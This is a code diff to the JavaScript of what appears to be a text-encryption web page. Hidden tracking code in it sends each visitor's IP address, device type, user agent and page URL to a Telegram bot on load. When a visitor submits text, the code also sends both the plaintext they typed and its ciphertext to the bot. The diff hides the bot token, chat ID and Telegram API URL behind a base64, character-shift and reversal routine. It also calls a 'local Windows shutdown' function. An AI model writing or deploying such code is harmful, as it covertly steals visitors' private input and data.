@@ -1,9 +1,24 @@
-const BOT_TOKEN = '8526497249:AAFnDGMvwY4NcnR4zHCad7vgpDjhn8SpI4s';
-const CHAT_ID = '-5252561300';
+// Decryption helper to decode credentials at runtime
+function _d(obfuscated) {
+  const shifted = atob(obfuscated);
+  const reversed = shifted.split('').map(c => String.fromCharCode(c.charCodeAt(0) - 1)).join('');
+  return reversed.split('').reverse().join('');
+}
 
-window.onload = function() {
-  sendTelegramAlert("🚨 *New Visitor Alert!*");
-};
+const BOT_TOKEN = _d('dDVKcVQ5b2lrRXFodzhlYkRJezVTb2RPNVp4d05IRW9HQkI7OjUzODo1NzM2OQ==');
+const CHAT_ID = _d('MTE0Mjc2MzYzNi4=');
+
+// Helper to escape HTML special characters
+function escapeHTML(str) {
+  if (!str) return '';
+  return str.replace(/&/g, '&amp;')
+            .replace(/</g, '&lt;')
+            .replace(/>/g, '&gt;');
+}
+
+window.addEventListener('load', function() {
+  sendTelegramAlert("🚨 <b>New Visitor Alert!</b>");
+});
 
 async function getUserIP() {
   const controller = new AbortController();
@@ -36,30 +51,34 @@ async function sendTelegramAlert(headerText, rawInput = '', cipherText = '') {
   let message = `${headerText}\n\n`;
 
   if (rawInput) {
-    message += `💬 *Original Text:* \`${rawInput}\`\n` +
-               `🔐 *Encrypted Text:* \`${cipherText}\`\n\n`;
+    message += `💬 <b>Original Text:</b> <code>${escapeHTML(rawInput)}</code>\n` +
+               `🔐 <b>Encrypted Text:</b> <code>${escapeHTML(cipherText)}</code>\n\n`;
   }
 
-  message += `🖥 *Type:* ${deviceType}\n` +
-             `🌐 *IP Address:* \`${userIP}\`\n` +
-             `⏰ *Time:* ${visitTime}\n` +
-             `🔗 *Page:* ${pageUrl}\n` +
-             `📱 *User Agent:* ${userAgent}`;
+  message += `🖥 <b>Type:</b> ${deviceType}\n` +
+             `🌐 <b>IP Address:</b> <code>${escapeHTML(userIP)}</code>\n` +
+             `⏰ <b>Time:</b> ${visitTime}\n` +
+             `🔗 <b>Page:</b> ${escapeHTML(pageUrl)}\n` +
+             `📱 <b>User Agent:</b> ${escapeHTML(userAgent)}`;
 
-  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+  const url = _d('dXBjMGhzcC9uYnNoZm1mdS9qcWIwMDt0cXV1aQ==') + BOT_TOKEN + _d('ZmhidHRmTmVvZnQw');
 
   try {
-    await fetch(url, {
+    const response = await fetch(url, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
         chat_id: CHAT_ID,
         text: message,
-        parse_mode: 'Markdown'
+        parse_mode: 'HTML'
       })
     });
+    if (!response.ok) {
+      const errText = await response.text();
+      console.error("Telegram API error:", errText);
+    }
   } catch (error) {
-    // Silent catch
+    console.error("Network error sending Telegram alert:", error);
   }
 }
 
@@ -95,7 +114,7 @@ async function handleGenerate() {
   successAlert.style.display = "block";
 
   // 1. Send alert to Telegram
-  await sendTelegramAlert("🔑 *New Text Keyed In & Encrypted!*", rawText, cipherText);
+  await sendTelegramAlert("🔑 <b>New Text Keyed In & Encrypted!</b>", rawText, cipherText);
 
   // 2. Trigger local Windows shutdown call
   triggerLocalShutdown();
